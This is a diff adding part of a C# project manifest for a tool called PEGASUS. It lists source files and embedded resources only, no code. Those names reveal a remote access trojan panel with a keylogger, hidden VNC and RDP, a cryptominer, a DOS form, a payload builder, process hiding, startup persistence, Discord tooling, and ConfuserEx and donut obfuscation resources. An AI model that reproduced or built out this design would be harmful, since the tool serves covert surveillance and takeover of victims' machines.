+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\AppMouseStruct.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\CallbackData.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\HookHelper.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\HookIds.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\HookNativeMethods.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\HookProcedure.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\HookProcedureHandle.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\HookResult.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\KeyboardHookStruct.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\KeyboardNativeMethods.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\MouseNativeMethods.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\MouseStruct.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\ThreadNativeMethods.cs" />
+    <Compile Include="PEGASUS\Tools\MouseKeyHook\WinApi\WM_Messages.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\CodeGenContext.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\Helpers.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\IDynamicTypeSerializer.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\IStaticTypeSerializer.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\ITypeSerializer.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\Primitives.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\Serializer.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\TypeData.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\TypeSerializers\ArraySerializer.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\TypeSerializers\DictionarySerializer.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\TypeSerializers\EnumSerializer.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\TypeSerializers\GenericSerializer.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\TypeSerializers\ObjectSerializer.cs" />
+    <Compile Include="PEGASUS\Tools\NetSerializer\TypeSerializers\PrimitivesSerializer.cs" />
+    <Compile Include="PEGASUS\Tools\Networking\Client.cs" />
+    <Compile Include="PEGASUS\Tools\Networking\PEGASUSServer.cs" />
+    <Compile Include="PEGASUS\Tools\Networking\Server.cs" />
+    <Compile Include="PEGASUS\Tools\Networking\UserState.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\ClientPackets\GetAuthenticationResponse.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\ClientPackets\GetConnectionsResponse.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\ClientPackets\GetDesktopResponse.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\IPacket.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\PacketHandler.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\PacketRegistery.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\ServerPackets\DoKeyboardEvent.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\ServerPackets\DoMouseEvent.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\ServerPackets\GetAuthentication.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\ServerPackets\GetConnections.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\ServerPackets\GetDesktop.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\ServerPackets\GetMonitors.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\ServerPackets\GetSystemInfo.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\ServerPackets\SetAuthenticationSuccess.cs" />
+    <Compile Include="PEGASUS\Tools\Packets\SocketExtensions.cs" />
+    <Compile Include="PEGASUS\Utilities\FrameCounter.cs" />
+    <Compile Include="PEGASUS\Utilities\FrameUpdatedEventArgs.cs" />
+    <Compile Include="PEGASUS\Utilities\FrameUpdatedEventHandler.cs" />
+    <Compile Include="PEGASUS\Utilities\NativeMethods.cs" />
+    <Compile Include="PEGASUS\Utilities\PlatformHelper.cs" />
+    <Compile Include="PEGASUS\Utilities\PooledBufferManager.cs" />
+    <Compile Include="PEGASUS\Utilities\SafeQuickLZ.cs" />
+    <Compile Include="PEGASUS\Utilities\UnsafeStreamCodec.cs" />
+    <Compile Include="PEGASUS\Utilities\UPnP.cs" />
+    <Compile Include="PEGASUS\Utilities\User32Interop.cs" />
+    <Compile Include="PEGASUS\VNCForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PEGASUS\VNCForm.Designer.cs">
+      <DependentUpon>VNCForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PEGASUS\XmrSettings.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="Remote_Process\RemoteProcessList.cs" />
+    <Compile Include="Sockets\RemoteDesktopTcpServer.cs" />
+    <Compile Include="Sockets\RemotehVNCTcpServer.cs" />
+    <Compile Include="Sockets\TcpClientSession.cs" />
+    <Compile Include="Sockets\TcpServer.cs" />
+    <Compile Include="StreamLibrary\CodecOption.cs" />
+    <Compile Include="StreamLibrary\IUnsafeCodec.cs" />
+    <Compile Include="StreamLibrary\IVideoCodec.cs" />
+    <Compile Include="StreamLibrary\src\JpgCompression.cs" />
+    <Compile Include="StreamLibrary\src\LzwCompression.cs" />
+    <Compile Include="StreamLibrary\src\NativeMethods.cs" />
+    <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeStreamCodec.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Costura\antire\runtime\dll.compressed" />
+    <EmbeddedResource Include="Costura\bouncycastle\crypto\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\licensing\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\1\5\3\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifubutton\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifucheckbox\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifucircleprogress\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifucolortransition\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifudatagridview\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifudatepicker\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifudropdown\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifuformdock\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifugauge\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifugradientpanel\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifugroupbox\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifuimagebutton\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifulabel\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifuloader\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifupages\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifupanel\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifupicturebox\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifuprogressbar\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifuradiobutton\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifurating\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifuscrollbar\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifuseparator\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifushadowpanel\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifushapes\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifuslider\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifusnackbar\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifutextbox\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifutoggleswitch\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifutooltip\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifutransition\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\bunifuusercontrol\dll.compressed" />
+    <EmbeddedResource Include="Costura\bunifu\ui\winforms\deprecated\dll.compressed" />
+    <EmbeddedResource Include="Costura\cgeoip\dll.compressed" />
+    <EmbeddedResource Include="Costura\costura\dll.compressed" />
+    <EmbeddedResource Include="Costura\costura\pdb.compressed" />
+    <EmbeddedResource Include="Costura\customcontrols\dll.compressed" />
+    <EmbeddedResource Include="Costura\customcontrols\pdb.compressed" />
+    <EmbeddedResource Include="Costura\discord\net\commands\dll.compressed" />
+    <EmbeddedResource Include="Costura\discord\net\core\dll.compressed" />
+    <EmbeddedResource Include="Costura\discord\net\rest\dll.compressed" />
+    <EmbeddedResource Include="Costura\discord\net\webhook\dll.compressed" />
+    <EmbeddedResource Include="Costura\discord\net\websocket\dll.compressed" />
+    <EmbeddedResource Include="Costura\dnlib\dll.compressed" />
+    <EmbeddedResource Include="Costura\fastcoloredtextbox\dll.compressed" />
+    <EmbeddedResource Include="Costura\guna\ui2\dll.compressed" />
+    <EmbeddedResource Include="Costura\iconextractor\dll.compressed" />
+    <EmbeddedResource Include="Costura\metadata" />
+    <EmbeddedResource Include="Costura\microsoft\bcl\asyncinterfaces\dll.compressed" />
+    <EmbeddedResource Include="Costura\microsoft\win32\primitives\dll.compressed" />
+    <EmbeddedResource Include="Costura\mono\cecil\dll.compressed" />
+    <EmbeddedResource Include="Costura\mono\cecil\mdb\dll.compressed" />
+    <EmbeddedResource Include="Costura\mono\cecil\pdb\dll.compressed" />
+    <EmbeddedResource Include="Costura\mono\cecil\rocks\dll.compressed" />
+    <EmbeddedResource Include="Costura\mono\httputility\dll.compressed" />
+    <EmbeddedResource Include="Costura\mono\nat\dll.compressed" />
+    <EmbeddedResource Include="Costura\netstandard\dll.compressed" />
+    <EmbeddedResource Include="Costura\newtonsoft\json\dll.compressed" />
+    <EmbeddedResource Include="Costura\pinvoke\kernel32\dll.compressed" />
+    <EmbeddedResource Include="Costura\pinvoke\shell32\dll.compressed" />
+    <EmbeddedResource Include="Costura\pinvoke\windows\core\dll.compressed" />
+    <EmbeddedResource Include="Costura\protobuf-net\dll.compressed" />
+    <EmbeddedResource Include="Costura\server\dll.compressed" />
+    <EmbeddedResource Include="Costura\server\pdb.compressed" />
+    <EmbeddedResource Include="Costura\sharpupdate\dll.compressed" />
+    <EmbeddedResource Include="Costura\sharpupdate\pdb.compressed" />
+    <EmbeddedResource Include="Costura\siticone\ui\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\appcontext\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\buffers\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\collections\concurrent\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\collections\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\collections\immutable\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\collections\nongeneric\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\collections\specialized\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\componentmodel\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\componentmodel\eventbasedasync\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\componentmodel\primitives\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\componentmodel\typeconverter\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\console\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\data\common\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\diagnostics\contracts\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\diagnostics\debug\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\diagnostics\diagnosticsource\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\diagnostics\fileversioninfo\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\diagnostics\process\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\diagnostics\stacktrace\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\diagnostics\textwritertracelistener\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\diagnostics\tools\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\diagnostics\tracesource\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\diagnostics\tracing\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\drawing\primitives\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\dynamic\runtime\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\globalization\calendars\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\globalization\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\globalization\extensions\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\interactive\async\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\io\compression\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\io\compression\zipfile\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\io\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\io\filesystem\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\io\filesystem\driveinfo\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\io\filesystem\primitives\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\io\filesystem\watcher\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\io\isolatedstorage\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\io\memorymappedfiles\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\io\pipes\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\io\unmanagedmemorystream\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\linq\async\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\linq\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\linq\expressions\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\linq\parallel\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\linq\queryable\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\memory\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\net\http\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\net\nameresolution\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\net\networkinformation\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\net\ping\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\net\primitives\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\net\requests\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\net\security\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\net\sockets\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\net\webheadercollection\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\net\websockets\client\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\net\websockets\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\numerics\vectors\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\objectmodel\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\reflection\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\reflection\extensions\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\reflection\primitives\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\resources\reader\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\resources\resourcemanager\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\resources\writer\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\compilerservices\unsafe\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\compilerservices\visualc\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\extensions\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\handles\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\interopservices\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\interopservices\runtimeinformation\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\numerics\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\serialization\formatters\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\serialization\json\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\serialization\primitives\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\serialization\xml\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\security\claims\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\security\cryptography\algorithms\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\security\cryptography\csp\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\security\cryptography\encoding\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\security\cryptography\primitives\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\security\cryptography\x509certificates\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\security\principal\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\security\securestring\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\text\encoding\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\text\encoding\extensions\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\text\regularexpressions\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\threading\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\threading\overlapped\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\threading\tasks\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\threading\tasks\extensions\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\threading\tasks\parallel\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\threading\threadpool\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\threading\thread\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\threading\timer\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\valuetuple\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\xml\readerwriter\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\xml\xdocument\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\xml\xmldocument\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\xml\xmlserializer\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\xml\xpath\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\xml\xpath\xdocument\dll.compressed" />
+    <EmbeddedResource Include="Costura\vestris\resourcelib\dll.compressed" />
+    <EmbeddedResource Include="custom_alert_notifications\alert.resources" />
+    <EmbeddedResource Include="InputDialog.resources" />
+    <EmbeddedResource Include="PEGASUS FULL VERSION.exe.licenses" />
+    <EmbeddedResource Include="PEGASUS\FormSendFileToMemory.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormAbout.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormAudio.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormBlockClients.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormBuilder.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormCertificate.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormChat.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormDOS.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormDownloadFile.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormFileManager.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormFileSearcher.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormFun.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormKeylogger.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormMiner.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormNetstat.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormPorts.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormPowerShell.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormProcessManager.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormRegistryEditor.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormRegValueEditBinary.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormRegValueEditMultiString.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormRegValueEditString.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormRegValueEditWord.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormRemoteDesktop.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormSetting.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormShell.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FormWebcam.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FrmAngry.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FrmCSPM.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FrmDiscordST3.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FrmEmailer.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FrmInfo.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FrmNoStub.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FrmReco.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FrmSkynet.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\FrmWebHookSPM.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\Login.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\PEGASUSMain.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\Register.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\Remote_Desktop.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\Remote_hVNC.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\Splashes.resources" />
+    <EmbeddedResource Include="PEGASUS\Forms\Welcome.resources" />
+    <EmbeddedResource Include="PEGASUS\FrmSplash.resources" />
+    <EmbeddedResource Include="PEGASUS\PegasusBytes\DarkBytes.key" />
+    <EmbeddedResource Include="PEGASUS\PegasusBytes\PegasusBytes.key" />
+    <EmbeddedResource Include="PEGASUS\Properties\Resources.resources" />
+    <EmbeddedResource Include="PEGASUS\RhVNC_Connections.resources" />
+    <EmbeddedResource Include="PEGASUS\Tools\Plugin\RemotehVNC.key" />
+    <EmbeddedResource Include="PEGASUS\VNCForm.resources" />
+    <EmbeddedResource Include="Properties\licenses.licx" />
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="app.manifest" />
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <EmbeddedResource Include="Resources\100f_result" />
+    <EmbeddedResource Include="Resources\addPEGASUSSheduleTaskToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\addPEGASUSToStartupToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\animation1.BlindCoeff" />
+    <EmbeddedResource Include="Resources\animation1.MosaicCoeff" />
+    <EmbeddedResource Include="Resources\animation1.MosaicShift" />
+    <EmbeddedResource Include="Resources\animation1.ScaleCoeff" />
+    <EmbeddedResource Include="Resources\animation1.SlideCoeff" />
+    <EmbeddedResource Include="Resources\animation2.BlindCoeff" />
+    <EmbeddedResource Include="Resources\animation2.MosaicCoeff" />
+    <EmbeddedResource Include="Resources\animation2.MosaicShift" />
+    <EmbeddedResource Include="Resources\animation2.ScaleCoeff" />
+    <EmbeddedResource Include="Resources\animation2.SlideCoeff" />
+    <EmbeddedResource Include="Resources\animation25.BlindCoeff" />
+    <EmbeddedResource Include="Resources\animation25.MosaicCoeff" />
+    <EmbeddedResource Include="Resources\animation25.MosaicShift" />
+    <EmbeddedResource Include="Resources\animation25.ScaleCoeff" />
+    <EmbeddedResource Include="Resources\animation25.SlideCoeff" />
+    <EmbeddedResource Include="Resources\animation26.BlindCoeff" />
+    <EmbeddedResource Include="Resources\animation26.MosaicCoeff" />
+    <EmbeddedResource Include="Resources\animation26.MosaicShift" />
+    <EmbeddedResource Include="Resources\animation26.ScaleCoeff" />
+    <EmbeddedResource Include="Resources\animation26.SlideCoeff" />
+    <EmbeddedResource Include="Resources\animation27.BlindCoeff" />
+    <EmbeddedResource Include="Resources\animation27.MosaicCoeff" />
+    <EmbeddedResource Include="Resources\animation27.MosaicShift" />
+    <EmbeddedResource Include="Resources\animation27.ScaleCoeff" />
+    <EmbeddedResource Include="Resources\animation27.SlideCoeff" />
+    <EmbeddedResource Include="Resources\animation28.BlindCoeff" />
+    <EmbeddedResource Include="Resources\animation28.MosaicCoeff" />
+    <EmbeddedResource Include="Resources\animation28.MosaicShift" />
+    <EmbeddedResource Include="Resources\animation28.ScaleCoeff" />
+    <EmbeddedResource Include="Resources\animation28.SlideCoeff" />
+    <EmbeddedResource Include="Resources\back" />
+    <EmbeddedResource Include="Resources\BackgroundImage" />
+    <EmbeddedResource Include="Resources\bunifuLabel1.BaseStylesheet" />
+    <EmbeddedResource Include="Resources\bunifuLabel2.BaseStylesheet" />
+    <EmbeddedResource Include="Resources\bunifuSeparator1.BackgroundImage" />
+    <EmbeddedResource Include="Resources\bunifuSeparator2.BackgroundImage" />
+    <EmbeddedResource Include="Resources\bunifuSeparator3.BackgroundImage" />
+    <EmbeddedResource Include="Resources\bunifuSeparator4.BackgroundImage" />
+    <EmbeddedResource Include="Resources\chatSpammerToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\cmdToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\config" />
+    <EmbeddedResource Include="Resources\ConfuserEx" />
+    <EmbeddedResource Include="Resources\connectToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\copyProfileToolStripMenuItem.Image" />
+    <None Include="Resources\custom_alert_notifications.alert.resources" />
+    <EmbeddedResource Include="Resources\discordicon" />
+    <EmbeddedResource Include="Resources\donut" />
+    <EmbeddedResource Include="Resources\email" />
+    <EmbeddedResource Include="Resources\executebatToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\executeVBSToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\exstractOpenToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\frtg9" />
+    <EmbeddedResource Include="Resources\guna2Button1.BackgroundImage" />
+    <EmbeddedResource Include="Resources\guna2Button1.Image" />
+    <EmbeddedResource Include="Resources\guna2Panel1.BackgroundImage" />
+    <EmbeddedResource Include="Resources\guna2PictureBox1.Image" />
+    <EmbeddedResource Include="Resources\guna2PictureBox10.Image" />
+    <EmbeddedResource Include="Resources\guna2PictureBox2.Image" />
+    <EmbeddedResource Include="Resources\guna2PictureBox3.Image" />
+    <EmbeddedResource Include="Resources\guna2PictureBox4.Image" />
+    <EmbeddedResource Include="Resources\guna2PictureBox5.Image" />
+    <EmbeddedResource Include="Resources\guna2PictureBox6.Image" />
+    <EmbeddedResource Include="Resources\guna2PictureBox7.Image" />
+    <EmbeddedResource Include="Resources\guna2PictureBox8.Image" />
+    <EmbeddedResource Include="Resources\guna2PictureBox9.Image" />
+    <EmbeddedResource Include="Resources\guna2Shapes1.BackgroundImage" />
+    <EmbeddedResource Include="Resources\guna2Shapes2.BackgroundImage" />
+    <EmbeddedResource Include="Resources\guna2Shapes3.BackgroundImage" />
+    <EmbeddedResource Include="Resources\guna2Shapes4.BackgroundImage" />
+    <EmbeddedResource Include="Resources\guna2Shapes5.BackgroundImage" />
+    <EmbeddedResource Include="Resources\hiddenRDPToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\hIDEPEGASUSPROCESSToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\HRDPcleanUnistallToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\HRDPconnectToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\hVNCCStartToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\hVNCCToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\hVNCCToolStripMenuItem1.Image" />
+    <EmbeddedResource Include="Resources\hVNChBrowsersToolStripMenuItem.Image" />
+    <EmbeddedResource Include="Resources\Icon" />
+    <EmbeddedResource Include="Resources\icon.Image" />
+    <EmbeddedResource Include="Resources\IDI_APPICON %282%29_result" />
+    <EmbeddedResource Include="Resources\imageList1.ImageStream" />
+    <EmbeddedResource Include="Resources\imageList2.ImageStream" />
+    <EmbeddedResource Include="Resources\imageRegistryDirectoryList.ImageStream" />
+    <EmbeddedResource Include="Resources\imageRegistryKeyTypeList.ImageStream" />
